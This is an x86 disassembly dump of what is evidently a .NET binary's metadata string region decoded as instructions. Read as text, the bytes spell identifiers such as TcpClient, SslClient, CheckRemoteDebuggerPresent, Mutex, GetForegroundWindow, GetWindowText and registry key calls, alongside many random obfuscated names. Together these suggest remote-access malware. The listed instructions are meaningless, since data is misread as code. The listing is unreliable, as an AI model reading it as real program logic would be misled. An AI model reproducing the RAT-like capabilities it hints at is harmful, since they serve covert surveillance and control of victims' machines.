  40999f:	74 00                	je     0x4099a1
  4099a1:	73 65                	jae    0x409a08
  4099a3:	74 5f                	je     0x409a04
  4099a5:	41                   	inc    %ecx
  4099a6:	73 46                	jae    0x4099ee
  4099a8:	6c                   	insb   (%dx),%es:(%edi)
  4099a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4099aa:	61                   	popa
  4099ab:	74 00                	je     0x4099ad
  4099ad:	4d                   	dec    %ebp
  4099ae:	61                   	popa
  4099af:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b0:	61                   	popa
  4099b1:	67 65 6d             	gs insl (%dx),%es:(%di)
  4099b4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4099b6:	74 42                	je     0x4099fa
  4099b8:	61                   	popa
  4099b9:	73 65                	jae    0x409a20
  4099bb:	4f                   	dec    %edi
  4099bc:	62 6a 65             	bound  %ebp,0x65(%edx)
  4099bf:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  4099c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4099c4:	6c                   	insb   (%dx),%es:(%edi)
  4099c5:	6c                   	insb   (%dx),%es:(%edi)
  4099c6:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  4099cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4099cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4099cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4099ce:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  4099d3:	65 74 00             	gs je  0x4099d6
  4099d6:	53                   	push   %ebx
  4099d7:	79 73                	jns    0x409a4c
  4099d9:	74 65                	je     0x409a40
  4099db:	6d                   	insl   (%dx),%es:(%edi)
  4099dc:	2e 4e                	cs dec %esi
  4099de:	65 74 00             	gs je  0x4099e1
  4099e1:	54                   	push   %esp
  4099e2:	61                   	popa
  4099e3:	72 67                	jb     0x409a4c
  4099e5:	65 74 00             	gs je  0x4099e8
  4099e8:	53                   	push   %ebx
  4099e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4099ea:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4099ed:	74 00                	je     0x4099ef
  4099ef:	53                   	push   %ebx
  4099f0:	79 73                	jns    0x409a65
  4099f2:	74 65                	je     0x409a59
  4099f4:	6d                   	insl   (%dx),%es:(%edi)
  4099f5:	2e 43                	cs inc %ebx
  4099f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4099f8:	6c                   	insb   (%dx),%es:(%edi)
  4099f9:	6c                   	insb   (%dx),%es:(%edi)
  4099fa:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4099ff:	6e                   	outsb  %ds:(%esi),(%dx)
  409a00:	73 2e                	jae    0x409a30
  409a02:	49                   	dec    %ecx
  409a03:	45                   	inc    %ebp
  409a04:	6e                   	outsb  %ds:(%esi),(%dx)
  409a05:	75 6d                	jne    0x409a74
  409a07:	65 72 61             	gs jb  0x409a6b
  409a0a:	74 6f                	je     0x409a7b
  409a0c:	72 2e                	jb     0x409a3c
  409a0e:	52                   	push   %edx
  409a0f:	65 73 65             	gs jae 0x409a77
  409a12:	74 00                	je     0x409a14
  409a14:	67 65 74 5f          	addr16 gs je 0x409a77
  409a18:	4f                   	dec    %edi
  409a19:	66 66 73 65          	data16 data16 jae 0x409a82
  409a1d:	74 00                	je     0x409a1f
  409a1f:	73 65                	jae    0x409a86
  409a21:	74 5f                	je     0x409a82
  409a23:	4f                   	dec    %edi
  409a24:	66 66 73 65          	data16 data16 jae 0x409a8d
  409a28:	74 00                	je     0x409a2a
  409a2a:	53                   	push   %ebx
  409a2b:	70 6c                	jo     0x409a99
  409a2d:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  409a34:	00 
  409a35:	70 49                	jo     0x409a80
  409a37:	59                   	pop    %ecx
  409a38:	67 6e                	outsb  %ds:(%si),(%dx)
  409a3a:	70 63                	jo     0x409a9f
  409a3c:	7a 55                	jp     0x409a93
  409a3e:	43                   	inc    %ebx
  409a3f:	6a 74                	push   $0x74
  409a41:	00 62 46             	add    %ah,0x46(%edx)
  409a44:	72 77                	jb     0x409abd
  409a46:	69 43 7a 4e 47 6c 68 	imul   $0x686c474e,0x7a(%ebx),%eax
  409a4d:	77 5a                	ja     0x409aa9
  409a4f:	6c                   	insb   (%dx),%es:(%edi)
  409a50:	74 00                	je     0x409a52
  409a52:	49                   	dec    %ecx
  409a53:	41                   	inc    %ecx
  409a54:	73 79                	jae    0x409acf
  409a56:	6e                   	outsb  %ds:(%esi),(%dx)
  409a57:	63 52 65             	arpl   %edx,0x65(%edx)
  409a5a:	73 75                	jae    0x409ad1
  409a5c:	6c                   	insb   (%dx),%es:(%edi)
  409a5d:	74 00                	je     0x409a5f
  409a5f:	54                   	push   %esp
  409a60:	6f                   	outsl  %ds:(%esi),(%dx)
  409a61:	55                   	push   %ebp
  409a62:	70 70                	jo     0x409ad4
  409a64:	65 72 49             	gs jb  0x409ab0
  409a67:	6e                   	outsb  %ds:(%esi),(%dx)
  409a68:	76 61                	jbe    0x409acb
  409a6a:	72 69                	jb     0x409ad5
  409a6c:	61                   	popa
  409a6d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a6e:	74 00                	je     0x409a70
  409a70:	57                   	push   %edi
  409a71:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409a75:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a7c:	74 5f                	je     0x409add
  409a7e:	53                   	push   %ebx
  409a7f:	73 6c                	jae    0x409aed
  409a81:	43                   	inc    %ebx
  409a82:	6c                   	insb   (%dx),%es:(%edi)
  409a83:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a8a:	74 5f                	je     0x409aeb
  409a8c:	53                   	push   %ebx
  409a8d:	73 6c                	jae    0x409afb
  409a8f:	43                   	inc    %ebx
  409a90:	6c                   	insb   (%dx),%es:(%edi)
  409a91:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a98:	74 5f                	je     0x409af9
  409a9a:	54                   	push   %esp
  409a9b:	63 70 43             	arpl   %esi,0x43(%eax)
  409a9e:	6c                   	insb   (%dx),%es:(%edi)
  409a9f:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409aa6:	74 5f                	je     0x409b07
  409aa8:	54                   	push   %esp
  409aa9:	63 70 43             	arpl   %esi,0x43(%eax)
  409aac:	6c                   	insb   (%dx),%es:(%edi)
  409aad:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409ab4:	74 68                	je     0x409b1e
  409ab6:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ab8:	74 69                	je     0x409b23
  409aba:	63 61 74             	arpl   %esp,0x74(%ecx)
  409abd:	65 41                	gs inc %ecx
  409abf:	73 43                	jae    0x409b04
  409ac1:	6c                   	insb   (%dx),%es:(%edi)
  409ac2:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409ac9:	73 74                	jae    0x409b3f
  409acb:	65 6d                	gs insl (%dx),%es:(%edi)
  409acd:	2e 4d                	cs dec %ebp
  409acf:	61                   	popa
  409ad0:	6e                   	outsb  %ds:(%esi),(%dx)
  409ad1:	61                   	popa
  409ad2:	67 65 6d             	gs insl (%dx),%es:(%di)
  409ad5:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ad7:	74 00                	je     0x409ad9
  409ad9:	45                   	inc    %ebp
  409ada:	6e                   	outsb  %ds:(%esi),(%dx)
  409adb:	76 69                	jbe    0x409b46
  409add:	72 6f                	jb     0x409b4e
  409adf:	6e                   	outsb  %ds:(%esi),(%dx)
  409ae0:	6d                   	insl   (%dx),%es:(%edi)
  409ae1:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ae3:	74 00                	je     0x409ae5
  409ae5:	53                   	push   %ebx
  409ae6:	79 73                	jns    0x409b5b
  409ae8:	74 65                	je     0x409b4f
  409aea:	6d                   	insl   (%dx),%es:(%edi)
  409aeb:	2e 43                	cs inc %ebx
  409aed:	6f                   	outsl  %ds:(%esi),(%dx)
  409aee:	6c                   	insb   (%dx),%es:(%edi)
  409aef:	6c                   	insb   (%dx),%es:(%edi)
  409af0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409af5:	6e                   	outsb  %ds:(%esi),(%dx)
  409af6:	73 2e                	jae    0x409b26
  409af8:	49                   	dec    %ecx
  409af9:	45                   	inc    %ebp
  409afa:	6e                   	outsb  %ds:(%esi),(%dx)
  409afb:	75 6d                	jne    0x409b6a
  409afd:	65 72 61             	gs jb  0x409b61
  409b00:	74 6f                	je     0x409b71
  409b02:	72 2e                	jb     0x409b32
  409b04:	67 65 74 5f          	addr16 gs je 0x409b67
  409b08:	43                   	inc    %ebx
  409b09:	75 72                	jne    0x409b7d
  409b0b:	72 65                	jb     0x409b72
  409b0d:	6e                   	outsb  %ds:(%esi),(%dx)
  409b0e:	74 00                	je     0x409b10
  409b10:	47                   	inc    %edi
  409b11:	65 74 43             	gs je  0x409b57
  409b14:	75 72                	jne    0x409b88
  409b16:	72 65                	jb     0x409b7d
  409b18:	6e                   	outsb  %ds:(%esi),(%dx)
  409b19:	74 00                	je     0x409b1b
  409b1b:	43                   	inc    %ebx
  409b1c:	68 65 63 6b 52       	push   $0x526b6365
  409b21:	65 6d                	gs insl (%dx),%es:(%edi)
  409b23:	6f                   	outsl  %ds:(%esi),(%dx)
  409b24:	74 65                	je     0x409b8b
  409b26:	44                   	inc    %esp
  409b27:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409b2b:	67 65 72 50          	addr16 gs jb 0x409b7f
  409b2f:	72 65                	jb     0x409b96
  409b31:	73 65                	jae    0x409b98
  409b33:	6e                   	outsb  %ds:(%esi),(%dx)
  409b34:	74 00                	je     0x409b36
  409b36:	67 65 74 5f          	addr16 gs je 0x409b99
  409b3a:	52                   	push   %edx
  409b3b:	65 6d                	gs insl (%dx),%es:(%edi)
  409b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  409b3e:	74 65                	je     0x409ba5
  409b40:	45                   	inc    %ebp
  409b41:	6e                   	outsb  %ds:(%esi),(%dx)
  409b42:	64 50                	fs push %eax
  409b44:	6f                   	outsl  %ds:(%esi),(%dx)
  409b45:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409b4c:	5f                   	pop    %edi
  409b4d:	43                   	inc    %ebx
  409b4e:	6f                   	outsl  %ds:(%esi),(%dx)
  409b4f:	75 6e                	jne    0x409bbf
  409b51:	74 00                	je     0x409b53
  409b53:	67 65 74 5f          	addr16 gs je 0x409bb6
  409b57:	50                   	push   %eax
  409b58:	72 6f                	jb     0x409bc9
  409b5a:	63 65 73             	arpl   %esp,0x73(%ebp)
  409b5d:	73 6f                	jae    0x409bce
  409b5f:	72 43                	jb     0x409ba4
  409b61:	6f                   	outsl  %ds:(%esi),(%dx)
  409b62:	75 6e                	jne    0x409bd2
  409b64:	74 00                	je     0x409b66
  409b66:	47                   	inc    %edi
  409b67:	65 74 50             	gs je  0x409bba
  409b6a:	61                   	popa
  409b6b:	74 68                	je     0x409bd5
  409b6d:	52                   	push   %edx
  409b6e:	6f                   	outsl  %ds:(%esi),(%dx)
  409b6f:	6f                   	outsl  %ds:(%esi),(%dx)
  409b70:	74 00                	je     0x409b72
  409b72:	50                   	push   %eax
  409b73:	61                   	popa
  409b74:	72 61                	jb     0x409bd7
  409b76:	6d                   	insl   (%dx),%es:(%edi)
  409b77:	65 74 65             	gs je  0x409bdf
  409b7a:	72 69                	jb     0x409be5
  409b7c:	7a 65                	jp     0x409be3
  409b7e:	64 54                	fs push %esp
  409b80:	68 72 65 61 64       	push   $0x64616572
  409b85:	53                   	push   %ebx
  409b86:	74 61                	je     0x409be9
  409b88:	72 74                	jb     0x409bfe
  409b8a:	00 43 6f             	add    %al,0x6f(%ebx)
  409b8d:	6e                   	outsb  %ds:(%esi),(%dx)
  409b8e:	76 65                	jbe    0x409bf5
  409b90:	72 74                	jb     0x409c06
  409b92:	00 46 61             	add    %al,0x61(%esi)
  409b95:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409b9c:	54 
  409b9d:	6f                   	outsl  %ds:(%esi),(%dx)
  409b9e:	4c                   	dec    %esp
  409b9f:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  409ba6:	74 65                	je     0x409c0d
  409ba8:	6d                   	insl   (%dx),%es:(%edi)
  409ba9:	2e 43                	cs inc %ebx
  409bab:	6f                   	outsl  %ds:(%esi),(%dx)
  409bac:	6c                   	insb   (%dx),%es:(%edi)
  409bad:	6c                   	insb   (%dx),%es:(%edi)
  409bae:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409bb3:	6e                   	outsb  %ds:(%esi),(%dx)
  409bb4:	73 2e                	jae    0x409be4
  409bb6:	49                   	dec    %ecx
  409bb7:	45                   	inc    %ebp
  409bb8:	6e                   	outsb  %ds:(%esi),(%dx)
  409bb9:	75 6d                	jne    0x409c28
  409bbb:	65 72 61             	gs jb  0x409c1f
  409bbe:	74 6f                	je     0x409c2f
  409bc0:	72 2e                	jb     0x409bf0
  409bc2:	4d                   	dec    %ebp
  409bc3:	6f                   	outsl  %ds:(%esi),(%dx)
  409bc4:	76 65                	jbe    0x409c2b
  409bc6:	4e                   	dec    %esi
  409bc7:	65 78 74             	gs js  0x409c3e
  409bca:	00 53 79             	add    %dl,0x79(%ebx)
  409bcd:	73 74                	jae    0x409c43
  409bcf:	65 6d                	gs insl (%dx),%es:(%edi)
  409bd1:	2e 54                	cs push %esp
  409bd3:	65 78 74             	gs js  0x409c4a
  409bd6:	00 47 65             	add    %al,0x65(%edi)
  409bd9:	74 57                	je     0x409c32
  409bdb:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409be2:	78 74                	js     0x409c58
  409be4:	00 50 45             	add    %dl,0x45(%eax)
  409be7:	4a                   	dec    %edx
  409be8:	54                   	push   %esp
  409be9:	6f                   	outsl  %ds:(%esi),(%dx)
  409bea:	65 45                	gs inc %ebp
  409bec:	78 64                	js     0x409c52
  409bee:	73 54                	jae    0x409c44
  409bf0:	44                   	inc    %esp
  409bf1:	75 00                	jne    0x409bf3
  409bf3:	49                   	dec    %ecx
  409bf4:	47                   	inc    %edi
  409bf5:	4e                   	dec    %esi
  409bf6:	68 76 57 62 43       	push   $0x43625776
  409bfb:	6d                   	insl   (%dx),%es:(%edi)
  409bfc:	47                   	inc    %edi
  409bfd:	70 48                	jo     0x409c47
  409bff:	75 00                	jne    0x409c01
  409c01:	6c                   	insb   (%dx),%es:(%edi)
  409c02:	43                   	inc    %ebx
  409c03:	4f                   	dec    %edi
  409c04:	72 61                	jb     0x409c67
  409c06:	72 6a                	jb     0x409c72
  409c08:	59                   	pop    %ecx
  409c09:	50                   	push   %eax
  409c0a:	74 55                	je     0x409c61
  409c0c:	71 43                	jno    0x409c51
  409c0e:	59                   	pop    %ecx
  409c0f:	75 00                	jne    0x409c11
  409c11:	4e                   	dec    %esi
  409c12:	54                   	push   %esp
  409c13:	6d                   	insl   (%dx),%es:(%edi)
  409c14:	57                   	push   %edi
  409c15:	53                   	push   %ebx
  409c16:	6b 41 67 7a          	imul   $0x7a,0x67(%ecx),%eax
  409c1a:	44                   	inc    %esp
  409c1b:	45                   	inc    %ebp
  409c1c:	71 6c                	jno    0x409c8a
  409c1e:	75 00                	jne    0x409c20
  409c20:	46                   	inc    %esi
  409c21:	72 44                	jb     0x409c67
  409c23:	74 79                	je     0x409c9e
  409c25:	48                   	dec    %eax
  409c26:	42                   	inc    %edx
  409c27:	61                   	popa
  409c28:	70 61                	jo     0x409c8b
  409c2a:	48                   	dec    %eax
  409c2b:	74 75                	je     0x409ca2
  409c2d:	00 75 75             	add    %dh,0x75(%ebp)
  409c30:	51                   	push   %ecx
  409c31:	4c                   	dec    %esp
  409c32:	64 59                	fs pop %ecx
  409c34:	6f                   	outsl  %ds:(%esi),(%dx)
  409c35:	4d                   	dec    %ebp
  409c36:	65 64 6e             	gs outsb %fs:(%esi),(%dx)
  409c39:	4c                   	dec    %esp
  409c3a:	76 00                	jbe    0x409c3c
  409c3c:	4a                   	dec    %edx
  409c3d:	7a 76                	jp     0x409cb5
  409c3f:	63 4d 46             	arpl   %ecx,0x46(%ebp)
  409c42:	6b 66 70 4c          	imul   $0x4c,0x70(%esi),%esp
  409c46:	4d                   	dec    %ebp
  409c47:	76 00                	jbe    0x409c49
  409c49:	56                   	push   %esi
  409c4a:	53                   	push   %ebx
  409c4b:	47                   	inc    %edi
  409c4c:	6b 4f 73 51          	imul   $0x51,0x73(%edi),%ecx
  409c50:	4a                   	dec    %edx
  409c51:	53                   	push   %ebx
  409c52:	6c                   	insb   (%dx),%es:(%edi)
  409c53:	56                   	push   %esi
  409c54:	54                   	push   %esp
  409c55:	76 00                	jbe    0x409c57
  409c57:	42                   	inc    %edx
  409c58:	42                   	inc    %edx
  409c59:	69 73 55 77 65 54 69 	imul   $0x69546577,0x55(%ebx),%esi
  409c60:	6b 61 76 00          	imul   $0x0,0x76(%ecx),%esp
  409c64:	69 49 45 45 5a 65 6b 	imul   $0x6b655a45,0x45(%ecx),%ecx
  409c6b:	75 6e                	jne    0x409cdb
  409c6d:	53                   	push   %ebx
  409c6e:	6b 65 76 00          	imul   $0x0,0x76(%ebp),%esp
  409c72:	6e                   	outsb  %ds:(%esi),(%dx)
  409c73:	68 70 79 4b 4d       	push   $0x4d4b7970
  409c78:	66 49                	dec    %cx
  409c7a:	7a 75                	jp     0x409cf1
  409c7c:	46                   	inc    %esi
  409c7d:	71 44                	jno    0x409cc3
  409c7f:	49                   	dec    %ecx
  409c80:	62 52 77             	bound  %edx,0x77(%edx)
  409c83:	00 67 50             	add    %ah,0x50(%edi)
  409c86:	4c                   	dec    %esp
  409c87:	6c                   	insb   (%dx),%es:(%edi)
  409c88:	6a 6b                	push   $0x6b
  409c8a:	52                   	push   %edx
  409c8b:	4f                   	dec    %edi
  409c8c:	4e                   	dec    %esi
  409c8d:	72 77                	jb     0x409d06
  409c8f:	75 52                	jne    0x409ce3
  409c91:	57                   	push   %edi
  409c92:	77 00                	ja     0x409c94
  409c94:	77 47                	ja     0x409cdd
  409c96:	4b                   	dec    %ebx
  409c97:	58                   	pop    %eax
  409c98:	77 73                	ja     0x409d0d
  409c9a:	78 72                	js     0x409d0e
  409c9c:	6d                   	insl   (%dx),%es:(%edi)
  409c9d:	43                   	inc    %ebx
  409c9e:	61                   	popa
  409c9f:	77 00                	ja     0x409ca1
  409ca1:	6c                   	insb   (%dx),%es:(%edi)
  409ca2:	53                   	push   %ebx
  409ca3:	63 67 58             	arpl   %esp,0x58(%edi)
  409ca6:	71 64                	jno    0x409d0c
  409ca8:	6b 70 69 67          	imul   $0x67,0x69(%eax),%esi
  409cac:	77 00                	ja     0x409cae
  409cae:	76 71                	jbe    0x409d21
  409cb0:	68 67 6c 6e 6f       	push   $0x6f6e6c67
  409cb5:	46                   	inc    %esi
  409cb6:	54                   	push   %esp
  409cb7:	64 69 77 00 47 65 74 	imul   $0x46746547,%fs:0x0(%edi),%esi
  409cbe:	46 
  409cbf:	6f                   	outsl  %ds:(%esi),(%dx)
  409cc0:	72 65                	jb     0x409d27
  409cc2:	67 72 6f             	addr16 jb 0x409d34
  409cc5:	75 6e                	jne    0x409d35
  409cc7:	64 57                	fs push %edi
  409cc9:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409cd0:	65 74 5f             	gs je  0x409d32
  409cd3:	43                   	inc    %ebx
  409cd4:	72 65                	jb     0x409d3b
  409cd6:	61                   	popa
  409cd7:	74 65                	je     0x409d3e
  409cd9:	4e                   	dec    %esi
  409cda:	6f                   	outsl  %ds:(%esi),(%dx)
  409cdb:	57                   	push   %edi
  409cdc:	69 6e 64 6f 77 00 6f 	imul   $0x6f00776f,0x64(%esi),%ebp
  409ce3:	4d                   	dec    %ebp
  409ce4:	79 4b                	jns    0x409d31
  409ce6:	52                   	push   %edx
  409ce7:	7a 4e                	jp     0x409d37
  409ce9:	4b                   	dec    %ebx
  409cea:	6e                   	outsb  %ds:(%esi),(%dx)
  409ceb:	79 77                	jns    0x409d64
  409ced:	00 74 59 52          	add    %dh,0x52(%ecx,%ebx,2)
  409cf1:	6e                   	outsb  %ds:(%esi),(%dx)
  409cf2:	67 43                	addr16 inc %ebx
  409cf4:	6d                   	insl   (%dx),%es:(%edi)
  409cf5:	6a 62                	push   $0x62
  409cf7:	4e                   	dec    %esi
  409cf8:	78 00                	js     0x409cfa
  409cfa:	42                   	inc    %edx
  409cfb:	55                   	push   %ebp
  409cfc:	77 74                	ja     0x409d72
  409cfe:	76 7a                	jbe    0x409d7a
  409d00:	72 42                	jb     0x409d44
  409d02:	7a 69                	jp     0x409d6d
  409d04:	64 58                	fs pop %eax
  409d06:	53                   	push   %ebx
  409d07:	75 6b                	jne    0x409d74
  409d09:	52                   	push   %edx
  409d0a:	78 00                	js     0x409d0c
  409d0c:	4d                   	dec    %ebp
  409d0d:	50                   	push   %eax
  409d0e:	79 5a                	jns    0x409d6a
  409d10:	7a 62                	jp     0x409d74
  409d12:	4d                   	dec    %ebp
  409d13:	69 59 61 43 64 78 00 	imul   $0x786443,0x61(%ecx),%ebx
  409d1a:	4d                   	dec    %ebp
  409d1b:	75 74                	jne    0x409d91
  409d1d:	65 78 00             	gs js  0x409d20
  409d20:	6a 64                	push   $0x64
  409d22:	72 51                	jb     0x409d75
  409d24:	4c                   	dec    %esp
  409d25:	6b 78 74 65          	imul   $0x65,0x74(%eax),%edi
  409d29:	41                   	inc    %ecx
  409d2a:	66 78 00             	data16 js 0x409d2d
  409d2d:	5a                   	pop    %edx
  409d2e:	7a 61                	jp     0x409d91
  409d30:	6f                   	outsl  %ds:(%esi),(%dx)
  409d31:	78 68                	js     0x409d9b
  409d33:	6e                   	outsb  %ds:(%esi),(%dx)
  409d34:	6e                   	outsb  %ds:(%esi),(%dx)
  409d35:	68 78 00 75 51       	push   $0x51750078
  409d3a:	48                   	dec    %eax
  409d3b:	42                   	inc    %edx
  409d3c:	58                   	pop    %eax
  409d3d:	50                   	push   %eax
  409d3e:	6f                   	outsl  %ds:(%esi),(%dx)
  409d3f:	5a                   	pop    %edx
  409d40:	6e                   	outsb  %ds:(%esi),(%dx)
  409d41:	6a 54                	push   $0x54
  409d43:	41                   	inc    %ecx
  409d44:	6e                   	outsb  %ds:(%esi),(%dx)
  409d45:	78 00                	js     0x409d47
  409d47:	70 71                	jo     0x409dba
  409d49:	62 43 6b             	bound  %eax,0x6b(%ebx)
  409d4c:	6c                   	insb   (%dx),%es:(%edi)
  409d4d:	69 4d 42 58 4b 6e 78 	imul   $0x786e4b58,0x42(%ebp),%ecx
  409d54:	00 4d 75             	add    %cl,0x75(%ebp)
  409d57:	7a 74                	jp     0x409dcd
  409d59:	6e                   	outsb  %ds:(%esi),(%dx)
  409d5a:	55                   	push   %ebp
  409d5b:	67 4f                	addr16 dec %edi
  409d5d:	6f                   	outsl  %ds:(%esi),(%dx)
  409d5e:	4d                   	dec    %ebp
  409d5f:	72 42                	jb     0x409da3
  409d61:	79 00                	jns    0x409d63
  409d63:	56                   	push   %esi
  409d64:	44                   	inc    %esp
  409d65:	56                   	push   %esi
  409d66:	78 4c                	js     0x409db4
  409d68:	6c                   	insb   (%dx),%es:(%edi)
  409d69:	69 64 79 43 79 00 48 	imul   $0x79480079,0x43(%ecx,%edi,2),%esp
  409d70:	79 
  409d71:	45                   	inc    %ebp
  409d72:	65 4a                	gs dec %edx
  409d74:	46                   	inc    %esi
  409d75:	6b 68 58 48          	imul   $0x48,0x58(%eax),%ebp
  409d79:	79 00                	jns    0x409d7b
  409d7b:	77 54                	ja     0x409dd1
  409d7d:	4d                   	dec    %ebp
  409d7e:	67 53                	addr16 push %ebx
  409d80:	57                   	push   %edi
  409d81:	79 59                	jns    0x409ddc
  409d83:	49                   	dec    %ecx
  409d84:	63 61 79             	arpl   %esp,0x79(%ecx)
  409d87:	00 49 6e             	add    %cl,0x6e(%ecx)
  409d8a:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409d91:	65 
  409d92:	41                   	inc    %ecx
  409d93:	72 72                	jb     0x409e07
  409d95:	61                   	popa
  409d96:	79 00                	jns    0x409d98
  409d98:	54                   	push   %esp
  409d99:	6f                   	outsl  %ds:(%esi),(%dx)
  409d9a:	41                   	inc    %ecx
  409d9b:	72 72                	jb     0x409e0f
  409d9d:	61                   	popa
  409d9e:	79 00                	jns    0x409da0
  409da0:	67 65 74 5f          	addr16 gs je 0x409e03
  409da4:	41                   	inc    %ecx
  409da5:	73 41                	jae    0x409de8
  409da7:	72 72                	jb     0x409e1b
  409da9:	61                   	popa
  409daa:	79 00                	jns    0x409dac
  409dac:	41                   	inc    %ecx
  409dad:	5a                   	pop    %edx
  409dae:	70 49                	jo     0x409df9
  409db0:	56                   	push   %esi
  409db1:	48                   	dec    %eax
  409db2:	4c                   	dec    %esp
  409db3:	54                   	push   %esp
  409db4:	6c                   	insb   (%dx),%es:(%edi)
  409db5:	64 79 61             	fs jns 0x409e19
  409db8:	62 62 79             	bound  %esp,0x79(%edx)
  409dbb:	00 67 65             	add    %ah,0x65(%edi)
  409dbe:	74 5f                	je     0x409e1f
  409dc0:	4b                   	dec    %ebx
  409dc1:	65 79 00             	gs jns 0x409dc4
  409dc4:	73 65                	jae    0x409e2b
  409dc6:	74 5f                	je     0x409e27
  409dc8:	4b                   	dec    %ebx
  409dc9:	65 79 00             	gs jns 0x409dcc
  409dcc:	43                   	inc    %ebx
  409dcd:	72 65                	jb     0x409e34
  409dcf:	61                   	popa
  409dd0:	74 65                	je     0x409e37
  409dd2:	53                   	push   %ebx
  409dd3:	75 62                	jne    0x409e37
  409dd5:	4b                   	dec    %ebx
  409dd6:	65 79 00             	gs jns 0x409dd9
  409dd9:	4f                   	dec    %edi
  409dda:	70 65                	jo     0x409e41
  409ddc:	6e                   	outsb  %ds:(%esi),(%dx)
  409ddd:	53                   	push   %ebx
  409dde:	75 62                	jne    0x409e42
  409de0:	4b                   	dec    %ebx
  409de1:	65 79 00             	gs jns 0x409de4
  409de4:	67 65 74 5f          	addr16 gs je 0x409e47
  409de8:	50                   	push   %eax
  409de9:	75 62                	jne    0x409e4d
  409deb:	6c                   	insb   (%dx),%es:(%edi)
  409dec:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409df3:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409dfa:	4b 65 
  409dfc:	79 00                	jns    0x409dfe
  409dfe:	47                   	inc    %edi
  409dff:	71 54                	jno    0x409e55
  409e01:	46                   	inc    %esi
  409e02:	61                   	popa
  409e03:	6c                   	insb   (%dx),%es:(%edi)
  409e04:	63 65 53             	arpl   %esp,0x53(%ebp)
  409e07:	57                   	push   %edi
  409e08:	54                   	push   %esp
  409e09:	63 57 68             	arpl   %edx,0x68(%edi)
  409e0c:	79 00                	jns    0x409e0e
  409e0e:	53                   	push   %ebx
  409e0f:	79 73                	jns    0x409e84
  409e11:	74 65                	je     0x409e78
  409e13:	6d                   	insl   (%dx),%es:(%edi)
  409e14:	2e 53                	cs push %ebx
  409e16:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e1a:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409e21:	70 
  409e22:	74 6f                	je     0x409e93
  409e24:	67 72 61             	addr16 jb 0x409e88
  409e27:	70 68                	jo     0x409e91
  409e29:	79 00                	jns    0x409e2b
  409e2b:	41                   	inc    %ecx
  409e2c:	73 73                	jae    0x409ea1
  409e2e:	65 6d                	gs insl (%dx),%es:(%edi)
  409e30:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409e34:	41                   	inc    %ecx
  409e35:	64 64 72 65          	fs fs jb 0x409e9e
  409e39:	73 73                	jae    0x409eae
  409e3b:	46                   	inc    %esi
  409e3c:	61                   	popa
  409e3d:	6d                   	insl   (%dx),%es:(%edi)
  409e3e:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409e45:	63 
  409e46:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409e4a:	79 00                	jns    0x409e4c
  409e4c:	54                   	push   %esp
  409e4d:	6f                   	outsl  %ds:(%esi),(%dx)
  409e4e:	42                   	inc    %edx
  409e4f:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e56:	65 74 5f             	gs je  0x409eb8
  409e59:	53                   	push   %ebx
  409e5a:	79 73                	jns    0x409ecf
  409e5c:	74 65                	je     0x409ec3
  409e5e:	6d                   	insl   (%dx),%es:(%edi)
  409e5f:	44                   	inc    %esp
  409e60:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409e67:	79 00                	jns    0x409e69
  409e69:	52                   	push   %edx
  409e6a:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409e71:	00 6f 
  409e73:	70 5f                	jo     0x409ed4
  409e75:	45                   	inc    %ebp
  409e76:	71 75                	jno    0x409eed
  409e78:	61                   	popa
  409e79:	6c                   	insb   (%dx),%es:(%edi)
